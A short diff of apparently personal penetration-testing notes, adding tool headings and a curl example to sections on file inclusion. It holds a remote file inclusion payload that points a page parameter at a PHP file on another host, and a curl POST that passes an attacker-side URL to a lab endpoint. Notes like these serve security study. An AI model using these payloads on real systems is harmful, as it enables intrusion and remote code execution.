@@ -1,6 +1,10 @@
 [Local File Inclusion](#local-file-inclusion)
 [Remote File Inclusion](#remote-file-inclusion)
+[Curl](#curl)
+[Gobuster](#gobuster)
+[Feroxbuster](#feroxbuster)
 [Java Code Execution](#java-code-execution)
+
 
 # Local File Inclusion
 - Click stuff to find out if we can find this ?file=, ?page=
@@ -17,9 +21,15 @@
 **Linux**
 
 
-
 # Remote File Inclusion
 - ?page=http://192.168.45.208/somefile.php
+
+
+# Curl 
+- When there are URLs pointing at something suspicious, change method (from GET to POST) with curl can give you clear answers
+```bash
+curl -X POST -d '{"user":"clumsyadmin", "url":"http://192.168.45.175:443/list-running-procs"}' http://192.168.163.99:33333/list-running-procs
+```
 
 
 
